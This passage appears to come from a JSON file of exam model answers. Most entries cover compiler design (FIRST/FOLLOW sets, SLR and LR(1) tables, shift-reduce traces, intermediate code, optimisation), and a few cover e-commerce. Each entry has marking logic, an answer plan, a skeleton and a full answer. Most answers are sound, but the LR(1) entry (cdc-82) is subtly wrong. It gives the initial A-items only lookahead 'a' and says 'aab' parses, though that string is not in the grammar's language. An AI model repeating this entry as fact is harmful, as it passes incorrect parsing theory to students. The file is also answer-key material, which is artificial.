L2\nt3 = t2 - 1\nL2: t4 = t2 / 2\nLeaders: the first line, the line after the if, and L2 — three blocks.\nFactors affecting the code generator: the target machine's instruction set and costs; the number and type of registers plus the allocation policy; the addressing modes available; the form of the intermediate code; instruction selection and peephole optimisation; and the memory hierarchy (cache, spill costs)."},"cdc-70":{"u":2,"logic":"Checks nullable-symbol bookkeeping in FIRST/FOLLOW; the ε in S and D is exactly where marks are lost.","how":"Compute FIRST for all four symbols first, then FOLLOW starting from $, and write one 'because' line per set.","skel":["FIRST: S={a,ε}, A={a,ε}, C={a}, D={a,ε}","FOLLOW(S) begins with $","Use FIRST(D) and D's nullability","FOLLOW(A) comes from aAb in the rule"],"ans":"Grammar: S → aAbCD | ε, A → SD | ε, C → Sa, D → aBD | ε.\nFIRST: S = {a, ε}; A = {a, ε}; C = {a}; D = {a, ε}. (A→SD gives FIRST(S) = {a}, plus FIRST(D) = {a} because S is nullable.)\nFOLLOW: S = {a, b, $}; A = {b}; C = {a, b, $}; D = {a, b, $}.\nWorking:\n• FOLLOW(S) = {$} ∪ {a, b}. The a comes from A→SD (a ∈ FIRST(D)) and from C→Sa; the b comes from FOLLOW(A), added because D is nullable.\n• FOLLOW(A) = {b}, from S → a A b C D.\n• FOLLOW(C) = FIRST(D) − ε = {a}, plus FOLLOW(S) because D is nullable.\n• FOLLOW(D) = FOLLOW(S) ∪ FOLLOW(A) = {a, b, $}, from S→aAbCD and A→SD; D→aBD adds nothing new.\nSo the parser needs these sets for the LL(1) table of the grammar."},"cdc-71":{"u":1,"logic":"The standard Unit 1 question: can you name every phase, place analysis and synthesis, and draw the two-pass diagram.","how":"Draw the diagram first and label the symbol table and error handler down the side, then one line per phase.","skel":["Definition plus analysis/synthesis split","Draw the six-phase block diagram","Symbol table and error handler as side boxes","One line and one example per phase"],"ans":"A compiler translates a source program into an equivalent target program (assembly or machine code) and reports errors. Its work is divided into analysis (front end, language dependent) and synthesis (back end, machine dependent).\nDraw the block diagram: source program → lexical analyser → syntax analyser → semantic analyser → intermediate code generator → code optimiser → code generator → target program, with symbol table and error handler as two boxes connected to every phase.\n• Lexical analysis — characters to tokens such as <id,1>; removes blanks and comments and fills the symbol table.\n• Syntax analysis — checks the token stream against the grammar and builds the parse tree.\n• Semantic analysis — type checking, scope resolution and insertion of coercions; reports type mismatch.\n• Intermediate code generation — machine-independent three-address code.\n• Code optimisation — faster, shorter IR: CSE, constant folding, dead-code removal.\n• Code generation — instruction selection and register allocation into target code.\nFor A * B + C − 2.5: tokens <id,1> * <id,2> + <id,3> − <num,2.5>; tree with + at the root; IR t1 = A*B, t2 = t1+C, t3 = t2−2.5; then LOAD R1,A; MUL R1,B; ADD R1,C; SUB R1,#2.5."},"cdc-72":{"u":2,"logic":"Tests direct RE to DFA by syntax-tree positions, which students skip in favour of Thompson plus subset construction.","how":"Number the positions, tabulate nullable/firstpos/lastpos, derive followpos, then let each DFA state be a position set.","skel":["Number positions p1=0, p2=1, p3=0","firstpos/lastpos per node","followpos: p1→{p1,p2}, p2→{p3}","DFA: A on 0→A, on 1→B final"],"ans":"(ε + 0)*10 means zero or more 0s, then a 1, then a 0 — the language 0*10 with shortest strings 10, 010, 0010.\nStep 1 — syntax tree with numbered positions: p1 = 0 inside the star, p2 = 1, p3 = the final 0.\nStep 2 — nullable, firstpos, lastpos: star node is nullable with firstpos = lastpos = {p1}; concat(star,1) gives {p1,p2}; the root's firstpos = {p1,p2} (star is nullable) and lastpos = {p3}.\nStep 3 — followpos: p1 gets {p1} from the star (a loop) and {p2} because p1 is in the lastpos of the left child of a concatenation; p2 gets {p3}; p3 gets nothing.\nStep 4 — DFA states are position sets:\n• A = {p1,p2}, start: on 0 → {p1,p2} = A; on 1 → {p3} = B.\n• B = {p3}, final: on 0 or 1 → ∅ (dead state).\nTransition table: A --0--> A, A --1--> B, B --0,1--> dead. B is the only accepting state, so 10, 010, 0010 are accepted while 11 and 100 are rejected."},"cdc-73":{"u":2,"logic":"Wants the stack machine shown in action; students define shift-reduce and skip the required trace table.","how":"Four-column table (stack, input, action) and name the handle at every reduce; never shift after seeing a handle.","skel":["Definition: shift, reduce, accept, error","Handle = right side of a production","Table stack | input | action","Reduce (x+x) before touching * a"],"ans":"Shift-reduce parsing is a bottom-up technique: the parser shifts input symbols onto a stack until the top of the stack matches the right side of some production (that string is the handle), then reduces the handle to the nonterminal on its left. It accepts when the stack holds only the start symbol and the input is exhausted, and reports an error when neither a shift nor a reduce is possible. It needs only a stack and an input pointer; the hard part is detecting the handle.\nGrammar: E → E+E | E*E | (E) | x, with a treated as x. Parsing (x+x)*a:\nStack | Input | Action\n$ | (x+x)*a$ | shift\n$( | x+x)*a$ | shift\n$(x | +x)*a$ | reduce E→x\n$(E | +x)*a$ | shift\n$(E+ | x)*a$ | shift\n$(E+x | )*a$ | reduce E→x\n$(E+E | )*a$ | reduce E→E+E\n$(E | )*a$ | shift\n$(E) | *a$ | reduce E→(E)\n$E | *a$ | shift\n$E* | a$ | shift\n$E*a | $ | reduce E→x\n$E*E | $ | reduce E→E*E\n$E | $ | accept"},"cdc-74":{"u":2,"logic":"The standard SLR construction; marks are for the item sets and the FOLLOW-restricted reduces, not the table alone.","how":"Augment with S'→S, list item sets I0..In in order, then fill reduces only where the lookahead is $.","skel":["Augment S'→S","Write all nine item sets","goto on a, b, A, S","Reduces only on $"],"ans":"Grammar: S → aAa | bAb | ba. The paper gives no productions for A, so A is read as a terminal symbol. Augmented grammar: S' → S. FOLLOW(S) = {$}, so every reduce goes in the $ column only.\nCanonical collection:\nI0: S'→·S, S→·aAa, S→·bAb, S→·ba\nI1 = goto(I0,S): S'→S·\nI2 = goto(I0,a): S→a·Aa\nI3 = goto(I0,b): S→b·Ab, S→b·a\nI4 = goto(I2,A): S→aA·a\nI5 = goto(I4,a): S→aAa·\nI6 = goto(I3,A): S→bA·b\nI7 = goto(I3,a): S→ba·\nI8 = goto(I6,b): S→bAb·\nSLR table:\nState | a | b | A | $ | S\n0 | s2 | s3 | — | — | 1\n1 | — | — | — | acc | —\n2 | — | — | s4 | — | —\n3 | s7 | — | s6 | — | —\n4 | s5 | — | — | — | —\n5 | — | — | — | S→aAa | —\n6 | — | s8 | — | — | —\n7 | — | — | — | S→ba | —\n8 | — | — | — | S→bAb | —\nNo cell holds two entries, so this is an SLR(1) grammar."},"cdc-75":{"u":3,"logic":"Checks that you can write an SDD and evaluate it on a concrete tree — the value 85 is the proof of the walk.","how":"Write the six E/T/F rules, then draw the tree with val on every node and compute 15, 17, 85 upward.","skel":["Write E→E+T, E→T, T→T*F, T→F, F→(E), F→digit","Draw tree for (5*3+2)*5","Annotate leaves 5, 3, 2, 5","Values 15 → 17 → 85 at the root"],"ans":"A syntax-directed definition attaches semantic rules to productions; here every attribute is synthesised (val), so the tree is annotated bottom-up.\nE → E1 + T   { E.val = E1.val + T.val }\nE → T         { E.val = T.val }\nT → T1 * F    { T.val = T1.val * F.val }\nT → F         { T.val = F.val }\nF → ( E )     { F.val = E.val }\nF → digit     { F.val = digit.lexval }\nAnnotated parse tree for (5*3+2)*5:\nE(85)\n└─ T(85) → T(15) * F(5)\n   ├─ T(15) → F(15) → ( E(17) )\n   │            E(17) → E(15) + T(2)\n   │              E(15) → T(15) → T(5) * F(3)\n   │              T(2)  → F(2)  → 2\n   └─ F(5) → 5\nEvaluation: 5*3 = 15, 15+2 = 17, (17) = 17, then 17*5 = 85 at the root E. Every node is annotated with its val, and the single bottom-up (post-order) pass is enough because the definition is S-attributed."},"cdc-76":{"u":4,"logic":"Tests whether type rules can be written as semantic actions for arithmetic, relational, array and pointer forms.","how":"One production per rule, each an if-then-else returning a type or type_error — five lines, most of the marks.","skel":["E→id: lookup the symbol-table type","op: numeric operands only, else error","relop gives boolean","Array index and pointer dereference checks"],"ans":"SDD for type checking (type is a synthesised attribute):\nE → id        { E.type = lookup(id.entry) }   — if absent, report 'undeclared'.\nE → E1 op E2  { if E1.type = int and E2.type = int then E.type = int\n                else if E1.type and E2.type are both numeric then E.type = real (insert int→real coercion)\n                else E.type = type_error }\nE → E1 relop E2 { if compatible(E1.type, E2.type) then E.type = boolean else E.type = type_error }\nE → E1 [ E2 ]  { if E1.type = array(s, t) and E2.type = int then E.type = t else E.type = type_error }\nE → E1 ↑       { if E1.type = pointer(t) then E.type = t else E.type = type_error }\nDiscussion: op covers + − * / and the result must be numeric, so 'a' + 2 is an error. compatible allows int with real by widening but never int with array or pointer. For vectors, i + j would give array(10,int) instead of int, which is why the index rule must return the element type t. Errors are reported once and E.type set to type_error to stop cascading."},"cdc-77":{"u":7,"logic":"Wants breadth: syntax tree, postfix, three-address code and its three table forms — all for one expression.","how":"Pick a = b*-c + b*-c and show the same expression five ways; the repetition is what earns the marks.","skel":["List the five representations","Same expression in each form","Quadruples (op,arg1,arg2,result)","Triples and indirect triples difference"],"ans":"Intermediate representations, using a = b * -c + b * -c:\n1. Syntax tree — operators as interior nodes, operands as leaves: root =, left a, right + whose children are two * subtrees.\n2. Postfix (linear) — a b c uminus * b c uminus * + =.\n3. Three-address code — t1 = -c; t2 = b*t1; t3 = -c; t4 = b*t3; t5 = t2+t4; a = t5.\n4. Quadruples — four fields (op, arg1, arg2, result):\n(uminus, c, -, t1), (*, b, t1, t2), (uminus, c, -, t3), (*, b, t3, t4), (+, t2, t4, t5), (=, t5, -, a).\n5. Triples — the result is the position of the triple, so no temporary names: (0) uminus c, (1) * b (0), (2) uminus c, (3) * b (2), (4) + (1) (3), (5) = a (4). Problem: inserting or reordering a triple renumbers everything after it.\n6. Indirect triples — a separate pointer array lists the order of triples, so moving code means moving a pointer, not a triple: order = 0,1,2,3,4,5.\nDAG is the same as the syntax tree but with the repeated b*-c shared, giving five nodes instead of nine."},"cdc-78":{"u":9,"logic":"Tests purpose plus loop-specific techniques; 'loop optimisation' is not one technique but a family of five.","how":"One-line purpose, then name five loop techniques with a two-line before/after each; label the loop block.","skel":["Purpose: time, size, memory, cache","Code motion of loop-invariant code","Strength reduction and IV elimination","Unrolling, jamming, and loop fusion"],"ans":"Purpose — to make the object program faster, smaller and cheaper in memory and power, without changing its output. Optimisation removes work the programmer wrote but the machine need not do; it must preserve semantics, be worth its cost, and not change observable behaviour.\nLoop optimisation (loops run the body n times, so a saving inside is multiplied):\n• Loop-invariant code motion — move code whose value never changes out of the loop. for(i=0;i<n;i++){ x = 5; a[i] = x*i; } becomes x = 5; for(...) a[i] = x*i;.\n• Strength reduction — replace a costly operation by a cheap one: i*4 becomes i<<2, and x*i inside a loop becomes an addition x = x + step.\n• Induction variable elimination — delete variables that always equal a linear function of the loop counter, e.g. j = 4*i replaced by j = j + 4.\n• Loop unrolling — replicate the body k times and step the counter by k, cutting loop overhead and enabling scheduling.\n• Loop jamming/fusion — merge two loops over the same range into one, halving the branch and index work.\nTogether these cut instruction count, memory traffic and branch cost; a typical example is a matrix row-sum loop made several times faster."},"cdc-79":{"u":8,"logic":"Standard Unit 8 essay; the examiner counts distinct factors with an example each, not flowing prose.","how":"Six headed factors with one sentence each; mention register allocation with a spill example for the last marks.","skel":["Target machine and instruction set","Registers and allocation policy","Instruction selection and addressing modes","IR form, peephole, memory hierarchy"],"ans":"Factors affecting target code generation:\n• Target machine architecture — the instruction set decides what can be done in one instruction. A machine with a three-address ADD can do a+b in one instruction, while a one-address accumulator machine needs LOAD, ADD, STORE.\n• Register availability and allocation — registers are the fastest storage, so the generator must keep frequently used values in them. More live values than registers forces spilling to memory; graph colouring with k colours decides which values share a register.\n• Instruction selection — the same IR node may map to several machine sequences; the generator picks the cheapest, e.g. using an auto-increment addressing mode for p++ or a single MUL for a shift sequence.\n• Addressing modes — base+offset, indexed and indirect modes let one instruction reach memory, reducing temporary loads.\n• Form of the intermediate code — three-address code, quadruples or a DAG; a DAG exposes common subexpressions so the generator emits them once.\n• Peephole optimisation and memory hierarchy — local rewrites on the emitted code remove redundant loads/stores, and cache behaviour decides block ordering and loop layout.\nThe generator must balance all six: faster code may mean more registers, larger code or worse cache use."},"cdc-80":{"u":1,"logic":"Tests that error handling is not only a parser job — every phase detects different errors and recovers differently.","how":"Table of phase | error detected | recovery, then one line on why continuing after an error matters.","skel":["Why: report many errors, never crash","Lexical: illegal character, skip it","Syntax: panic mode, sync tokens","Semantic: type error, insert coercion"],"ans":"Importance — a compiler is used by programmers who make many mistakes, so it must detect errors, report each with a line number and a clear message, and recover enough to continue, so one run reveals many faults instead of one. A good handler also prevents the compiler itself from crashing and stops cascading messages that hide the real error.\nHow it works in each phase:\n• Lexical analysis — detects illegal characters, malformed numbers and unterminated comments; recovery by deleting the offending character or the rest of the line.\n• Syntax analysis — detects missing semicolons, unbalanced parentheses, wrong token order; recovery by panic mode (pop the stack until a synchronising token such as ; or } ), phrase-level recovery, or error productions.\n• Semantic analysis — detects undeclared names, type mismatch, wrong number of arguments, duplicate declaration; recovery by inserting a coercion, assuming the declared type, or marking the node type_error so later checks stay silent.\n• Intermediate code and code generation — detect too many temporaries or a value that does not fit a register; recovery by spilling.\nThe error handler is therefore a shared module that every phase calls, with a count limit so a hopeless file stops after a fixed number of messages."},"cdc-81":{"u":2,"logic":"Combines the lexical-analysis task list with an RE to DFA conversion; two half-answers, both must be finished.","how":"Five task bullets, the 5-tuple definition, then build the 5-state DFA for 'penultimate symbol is a'.","skel":["Tasks: tokens, strip comments, symbol table, errors","DFA = (Q, Σ, δ, q0, F)","Reduce (a+b)*a(a+b) to last-two-symbols","Five states, two final"],"ans":"Tasks of lexical analysis: (1) scan the character stream and group characters into lexemes; (2) classify each lexeme as a token <name, attribute>, e.g. <id,1>, <num,42>, <if>; (3) discard blanks, tabs, newlines and comments; (4) enter identifiers and constants in the symbol and literal tables; (5) report lexical errors such as an illegal character; (6) buffer the input for speed (two-buffer sentinel scheme).\nDFA — a deterministic finite automaton is a 5-tuple (Q, Σ, δ, q0, F): finite states, finite input alphabet, a transition function δ: Q×Σ→Q that is total and single-valued, a start state, and a set of final states. It accepts a string if the walk ends in F.\nFor (a+b)*a(a+b) — strings whose second-last symbol is a — track the last two symbols:\nState | a | b | final?\nS (start) | A | B | no\nA (last a) | F1 | F2 | no\nB (last b, prev not a) | A | B | no\nF1 (aa) | F1 | F2 | yes\nF2 (ab) | A | B | yes\nMinimum length is 2 (\"aa\", \"ab\"); \"aba\" is accepted, \"abb\" is not."},"cdc-82":{"u":2,"logic":"Tests the lookahead idea: an LR(1) item carries a terminal, which is why reduces here cannot clash.","how":"Four contrast bullets, then item sets with lookaheads in brackets and reduces only on that lookahead.","skel":["LR(0) item vs LR(1) item with lookahead","Table size and parsing power","Augment S'→S and list I0..I9","Reduce on bracketed lookahead only"],"ans":"LR(0) vs LR(1):\n• Item — LR(0) item is [A→α·β], no lookahead; LR(1) item is [A→α·β, a], carrying one terminal as lookahead.\n• Reduce decision — LR(0) reduces whenever the dot is at the end, whatever follows (so it accepts fewer grammars); LR(1) reduces only if the next input is the item's lookahead.\n• Power — every LR(1) grammar is unambiguous and LR(1) handles grammars LR(0) cannot; LR(0) is a strict subset.\n• Cost — LR(1) has far more states and a bigger table; LALR(1) merges states with the same core to get LR(1) power at LR(0) size.\nGrammar: S → A A, A → a A | b. Augmented: S' → S.\nI0: S'→·S,$ ; S→·AA,$ ; A→·aA,a ; A→·b,a\nI1=goto(I0,S): S'→S·,$ ACCEPT\nI2=goto(I0,A): S→A·A,$ ; A→·aA,$ ; A→·b,$\nI3=goto(I0,a): A→a·A,a ; A→·aA,a ; A→·b,a\nI4=goto(I0,b): A→b·,a\nI5=goto(I2,A): S→AA·,$\nI6=goto(I2,a): A→a·A,$ ; A→·aA,$ ; A→·b,$\nI7=goto(I2,b): A→b·,$\nI8=goto(I3,A): A→aA·,a ; I3 on a = I3, on b = I4\nI9=goto(I6,A): A→aA·,$ ; I6 on a = I6, on b = I7\nTable (a | b | $ | S | A):\n0: s3 s4 — 1 2    1: — — acc — —\n2: s6 s7 — — 5    3: s3 s4 — — 8\n4: r3(a only)      5: r1 on $      6: s6 s7 — — 9\n7: r3 on $         8: r2 on a      9: r2 on $\nSo aab parses: shift a, shift a, reduce A→b, reduce A→aA, then shift b, reduce A→b, reduce S→AA, accept."},"cdc-83":{"u":4,"logic":"Given as a statement, so it wants justification and mechanism: static vs dynamic, the rules, and where in the compiler.","how":"Restate as a definition, contrast static and dynamic, then give three SDD type rules and one coercion example.","skel":["Definition and goal of type checking","Static vs dynamic checking","Type inference SDD rules","Coercion int→real, type_error"],"ans":"Type checking is the semantic-analysis pass that verifies every operator and variable use obeys the language's type system, so type errors are caught before execution. A type system is the set of rules that assigns a type expression (int, real, array(10,int), pointer(int), function) to each construct.\nWhy before execution: an error such as x = \"abc\" + 5 or p↑ when p is not a pointer would otherwise fail unpredictably at run time; catching it at compile time costs no run-time test.\nStatic vs dynamic: static checking is done by the compiler from declarations (C, Java, Pascal); dynamic checking attaches a tag to each value and tests at run time (Python, JavaScript). Languages may mix — Java checks types statically but array bounds dynamically.\nMechanism — a syntax-directed definition with a synthesised attribute type:\n• E → id { E.type = lookup(id.entry) }\n• E → E1 + E2 { if both int then int else if both numeric then real else type_error }\n• E → E1 [ E2 ] { if E1.type = array(s,t) and E2.type = int then t else type_error }\nImplicit coercion widens int to real safely; narrowing double to int needs an explicit cast. Errors are reported once, and the node is marked type_error to stop cascading. Type equivalence is by structure or by name."},"cdc-84":{"u":1,"logic":"A guaranteed comparison question; marks come from matched pairs plus examples, not from two separate definitions.","how":"Six paired points in two columns, then name C as compiler and Python as interpreter for the last line.","skel":["Whole program vs statement by statement","Object code vs none","Speed, memory, error reporting","C/C++ vs Python/JavaScript"],"ans":"A compiler translates the whole source program into an equivalent target program (object code) before it runs; an interpreter executes the source statement by statement, producing no object file.\n• Translation — compiler: entire program at once, in phases; interpreter: one statement at a time.\n• Output — compiler produces object/assembly code that can be kept and reused; interpreter produces only results.\n• Speed — compiled code runs much faster because translation is done once; interpreted code reruns the translation for every statement each time, so it is slower.\n• Memory — the compiler needs memory for the source, the IR and the object code; the interpreter needs less, only the source and its tables.\n• Errors — a compiler reports all errors of a pass together after scanning the whole program; an interpreter stops at the first error, at the line where it occurs.\n• Debugging and portability — interpreted code is easier to debug and portable (any machine with the interpreter); compiled code must be rebuilt per machine.\nExamples: C, C++ and Java (javac) are compiled; Python and JavaScript are interpreted (Python compiles to bytecode then interprets it). A JIT compiler mixes both, compiling hot paths at run time."},"cdc-85":{"u":5,"logic":"Checks the concrete fields rather than the data structures; students often answer hash tables instead of entries.","how":"Ten entries with a one-line example from a declaration such as int x; — name, type, size, offset.","skel":["Name, type and type expression","Kind: variable, function, class, constant","Scope level and storage class","Offset, size, parameters, return type"],"ans":"The symbol table records one entry per declared name, with these typical fields:\n• Name — the lexeme, e.g. count, and a pointer to it in the string table.\n• Type — int, real, char, or a type expression such as array(10,int) or pointer(real).\n• Kind — variable, parameter, function, procedure, class or constant, which decides what operations are legal.\n• Scope / nesting level — the block in which the name is visible, used for shadowing and for scope exit.\n• Storage class — auto, static, extern or register.\n• Offset — position of the variable inside its activation record, used by the code generator.\n• Size — bytes occupied, e.g. 4 for int, 40 for array(10,int).\n• Line of declaration — for error messages.\n• For arrays — number of dimensions and the bounds of each.\n• For functions — the parameter list (number, types and order), return type, and whether it is defined or only declared.\n• For constants — the value itself, which enables constant folding.\nExample: for int a[10]; the entry is name a, type array(10,int), kind variable, size 40, offset within the frame."},"cdc-86":{"u":2,"logic":"Tests the A→Aα | β rewrite and whether you scan the whole grammar for indirect recursion first.","how":"Write the rule, apply it to S, then to B — three grammar blocks in order, no prose between them.","skel":["Define direct and indirect left recursion","Rule: A→βA', A'→αA' | ε","Apply to S→SB | Ca","Apply to B→Bb | c"],"ans":"A grammar is left-recursive if some nonterminal A can derive a string beginning with A, i.e. A ⇒+ Aα. Direct left recursion has a production A → Aα | β; indirect recursion reaches it through other nonterminals (A ⇒ B ⇒ A). Left recursion makes a recursive-descent parser loop forever, so it is removed before top-down parsing.\nRule: A → Aα | β becomes A → βA' and A' → αA' | ε.\nGrammar: S → SB | Ca, B → Bb | c, C → aB | a. Order S, B, C. C has no recursion.\nStep 1 — S → SB | Ca has α = B, β = Ca:\nS → CaS'\nS' → BS' | ε\nStep 2 — B → Bb | c has α = b, β = c:\nB → cB'\nB' → bB' | ε\nFinal grammar:\nS → CaS'\nS' → BS' | ε\nB → cB'\nB' → bB' | ε\nC → aB | a\nFor indirect recursion the procedure is: order the nonterminals A1..An, then for each Ai replace Ai → Ajγ (j < i) by the Aj productions, and finally remove the direct recursion — exactly as done for S."},"cdc-87":{"u":2,"logic":"Wants the limitations of shift-reduce plus a full trace; the grammar is ambiguous, so mention how conflicts arise.","how":"Four disadvantages first, then the stack table; reduce each bracket's inside before shifting past it.","skel":["Disadvantages: conflicts, no backtracking","Needs handle detection, ambiguous grammar","Table stack | input | action","End with $E$ accept"],"ans":"Disadvantages of shift-reduce parsing:\n• Handle detection — it must know when the top of the stack forms a handle; with an ambiguous grammar such as E → E−E | E/E more than one handle is possible, giving shift-reduce and reduce-reduce conflicts.\n• No backtracking — a wrong shift or reduce cannot be undone, so the parser needs a table (SLR/CLR) to choose correctly.\n• Only a restricted class of grammars can be handled deterministically, and the table can be large.\n• Error detection is delayed: the error is found only when no action exists, often long after the bad token.\nGrammar: E → E−E | E/E | (E) | x. Parsing w = (x−x)−(x/x):\nStack | Input | Action\n$ | (x−x)−(x/x)$ | shift\n$( | x−x)−(x/x)$ | shift\n$(x | −x)−(x/x)$ | reduce E→x\n$(E | −x)−(x/x)$ | shift\n$(E− | x)−(x/x)$ | shift\n$(E−x | )−(x/x)$ | reduce E→x\n$(E−E | )−(x/x)$ | reduce E→E−E\n$(E | )−(x/x)$ | shift\n$(E) | −(x/x)$ | reduce E→(E)\n$E | −(x/x)$ | shift\n$E− | (x/x)$ | shift\n$E−( | x/x)$ | shift\n$E−(x | /x)$ | reduce E→x\n$E−(E | /x)$ | shift\n$E−(E/ | x)$ | shift\n$E−(E/x | )$ | reduce E→x\n$E−(E/E | )$ | reduce E→E/E\n$E−(E | )$ | shift\n$E−(E) | $ | reduce E→(E)\n$E−E | $ | reduce E→E−E\n$E | $ | accept"},"cdc-88":{"u":3,"logic":"Tests attribute grammar as a concept plus the inherited/synthesised distinction on real productions.","how":"One grammar showing both: E→E+T is synthesised, D→TL→id uses inherited L.in — draw both directions.","skel":["Attribute grammar = grammar + attributes + rules","Synthesised: child to parent","Inherited: parent or sibling to child","One production example each"],"ans":"An attribute grammar is a context-free grammar extended with attributes for each grammar symbol and semantic rules for each production that compute those attributes; the attribute values carry meaning (type, value, code) while the grammar carries syntax.\nSynthesised attribute — its value is computed from the children of the node, so it flows upwards. Example:\nE → E1 + T   { E.val = E1.val + T.val }\nE → T          { E.val = T.val }\nT → num       { T.val = num.lexval }\nHere val is synthesised; for 3 + 4 the root computes 3 + 4 = 7. This is an S-attributed definition, evaluated in one bottom-up pass.\nInherited attribute — its value comes from the parent or a sibling, so it flows downwards or sideways. Example (declaration types):\nD → T L        { L.in = T.type }\nT → int        { T.type = int }\nL → L1 , id    { L1.in = L.in; addtype(id.entry, L.in) }\nL → id         { addtype(id.entry, L.in) }\nHere L.in is inherited: for int a, b the type int passes from T down to every identifier. A definition using both, with inherited values depending only on the left, is L-attributed and is evaluated left to right in one pass."},"cdc-89":{"u":7,"logic":"Mechanical marks: can you linearise a unary-minus expression and lay out quadruples in evaluation order.","how":"Number temporaries in evaluation order (innermost first), then write (op, arg1, arg2, result) rows.","skel":["Define TAC: x = y op z","t1 = −b, t2 = c + d","t3 = t1 * t2, t4 = t3 / e","Quadruple table with 5 rows"],"ans":"Three-address code is an intermediate form in which each instruction has at most one operator and three addresses, of the kinds x = y op z, x = op y, x = y, goto L, if x relop y goto L, param/call/return.\nFor a = −b * (c + d) / e, precedence gives: unary minus on b, then the bracket, then *, then /.\nThree-address code:\nt1 = − b\nt2 = c + d\nt3 = t1 * t2\nt4 = t3 / e\na  = t4\nQuadruples (op, arg1, arg2, result):\n0 | uminus | b | − | t1\n1 | + | c | d | t2\n2 | * | t1 | t2 | t3\n3 | / | t3 | e | t4\n4 | = | t4 | − | a\nRead row by row: t1 = −b, t2 = c+d, t3 = t1*t2, t4 = t3/e, a = t4. The same code written as triples drops the result column and refers to rows 0–3 instead of t1–t4."},"cdc-90":{"u":6,"logic":"Tests the three allocation strategies and the activation record contents, often confused with symbol tables.","how":"Three headed strategies, then draw one activation record with its seven fields labelled.","skel":["Static, stack, heap allocation","Activation record fields","Static link vs dynamic link","Parameter passing and garbage collection"],"ans":"Run-time storage management decides where and when storage is allocated for names.\n1. Static allocation — every name gets a fixed address at compile time, laid out in the data area. Sizes must be known at compile time and recursion is impossible; used for globals, static and extern variables in C.\n2. Stack allocation — storage is organised as a stack of activation records, pushed on a call and popped on return, so recursion works. Locals, parameters and temporaries live here; a frame pointer and stack pointer address the current frame.\n3. Heap allocation — storage is taken from a large free area at run time by malloc/new and released by free or a garbage collector. It is flexible (linked lists, dynamic arrays) but slower and causes fragmentation.\nActivation record (frame) fields: actual parameters, return address, saved machine registers (FP/SP), local variables, temporaries, access (static) link to the enclosing lexical scope, control (dynamic) link to the caller's frame, and the returned value. Parameter passing may be by value, reference, value-result or name; heap storage is reclaimed by reference counting, mark-and-sweep or copying collection."},"cdc-91":{"u":9,"logic":"Combines the 'why optimise' list with a definition and a worked example of dead-code elimination.","how":"Four advantages, then define dead code and strike out two lines from a four-line block.","skel":["Advantages: time, size, memory, cache","Must preserve semantics","Dead code = value never used again","Example: x=1 overwritten before use"],"ans":"Advantages of code optimisation:\n• Faster execution — fewer instructions in loops, which dominates run time.\n• Smaller object code — less memory and fewer instruction-cache misses.\n• Less memory traffic — fewer loads/stores and better register use.\n• Lower power and cost — the program finishes sooner and fits smaller devices.\nConstraint: optimisation must preserve the meaning of the program, must be worth its compile-time cost, and must not change observable behaviour.\nDead-code elimination — removing code whose results can never be used or which can never be reached, so it only wastes time.\nExample 1: x = 1; x = 2; y = x — the first assignment is dead, since x is overwritten before any use. Delete it.\nExample 2: t = a + b; t = c * d; use(t) — the first t is dead.\nExample 3: unreachable code after an unconditional return or after if (0) then ... can be deleted.\nDetection uses live-variable analysis: a definition is dead if the variable is not live on any path out of that point, and def-use chains show definitions with no use. Dead code often appears after constant folding and copy propagation, so it is run last in a pass."},"cdc-92":{"u":8,"logic":"A repeat of the factors question in the same paper set — near-certain marks if the list is memorised.","how":"Same list as the 10-mark version but one line per factor; it repeats, so it is a sure shot.","skel":["Six factors, one line each","Instruction set and registers","Addressing modes and IR form","Peephole and memory hierarchy"],"ans":"Design issues (factors) of the code generator:\n• Target machine instruction set — a three-address machine does a+b in one ADD, an accumulator machine needs LOAD/ADD/STORE, so instruction selection depends on the architecture.\n• Register allocation and assignment — keep hot values in registers, spill when live values exceed registers; graph colouring or next-use heuristics decide which value goes where.\n• Instruction selection — choose the cheapest equivalent sequence per IR node, e.g. use MUL by a power of two as a shift, or an auto-increment mode for p++.\n• Addressing modes — indexed, base+offset and indirect modes let one instruction touch memory, saving temporary loads.\n• Form of the IR — three-address code, quadruples or a DAG; a DAG exposes common subexpressions so they are emitted once.\n• Peephole optimisation and memory hierarchy — local rewrites remove redundant loads/stores and jump-to-jump, while cache behaviour guides block ordering.\nThe generator trades code size, register pressure and speed; this is the same list as the earlier factors question, so it is a sure shot."},"ecom-1":{"u":1,"logic":"Tests whether you can place three framework layers in the real world rather than recite five layer names, then convert that into two concrete B2B responses. Examiners want adaptation, not definition.","how":"Draw the five-layer framework, label the three asked, then one line each on e-distribution and e-procurement. Framework diagram plus two definitions is half the marks.","skel":["Framework = five layers, three asked","People: skill, trust, digital literacy","Policy: ETA 2063, NRB, wallets","Support: payment, logistics, certification","Adapt: e-distribution and e-procurement benefits"],"ans":"People, public policy and support services are three layers of the e-commerce framework; they decide whether a transaction is legal and deliverable.\n• People — buyers, sellers, intermediaries, IS staff, managers. Their skill and trust limit adoption; a buyer who fears card fraud stalls the chain.\n• Public policy — privacy, tax, jurisdiction, cybercrime law. Nepal's Electronic Transactions Act 2063 validates e-records and signatures; NRB licenses eSewa, Khalti and connectIPS. Without these, online payment is not lawful.\n• Support services — gateways, logistics, certification, hosting, security. Weak last-mile delivery outside Kathmandu, not the website, caps Nepali e-commerce.\nAdaptation: e-distribution moves catalogue, ordering and after-sales to web, app or dealer portal with live stock and tracking. e-procurement moves requisition, RFQ, approval and PO onto a private network or hub, cutting cycle time, maverick buying and data-entry errors, and linking to supplier ERP.\nEffect: shorter order cycles, lower search cost, auditable transactions, fewer disputes."},"ecom-2":{"u":3,"logic":"Two topics in one question: a payment instrument and a business-model choice. It checks that you can define e-cheque with its PKI dependency, then match auction rules to real revenue use cases.","how":"Half page on e-cheque flow (sign, verify, clear), then five auctions as a labelled list with one use case each. Naming the winner rule earns the mark.","skel":["E-cheque = signed electronic payment instruction","Flow: sign, verify certificate, bank clears","English and Dutch auctions","First-price and Vickrey sealed bids","Double auction for commodity matching"],"ans":"An e-cheque is the electronic equivalent of a paper cheque: a digitally signed payment instruction drawn on a bank account, sent over a network and cleared through the banking system. The payer signs with a private key; the payee verifies with the payer's public-key certificate; the bank debits the account. It needs PKI, a shared template (FSTC model) and legal backing such as the Electronic Transactions Act 2063.\nAuction mechanisms your platform can offer:\n• English (ascending, open) — bidders raise the price, highest wins. Use: art, used phones, collectibles.\n• Dutch (descending) — price falls until the first acceptor buys. Use: perishables, freight capacity, bulk clearance.\n• First-price sealed bid — one secret bid each, highest pays own bid. Use: tenders, scrap, government contracts.\n• Vickrey (second-price sealed) — highest wins but pays the second-highest bid, so truthful bidding is best. Use: licence and ad-slot allocation.\n• Double auction — many buyers and sellers 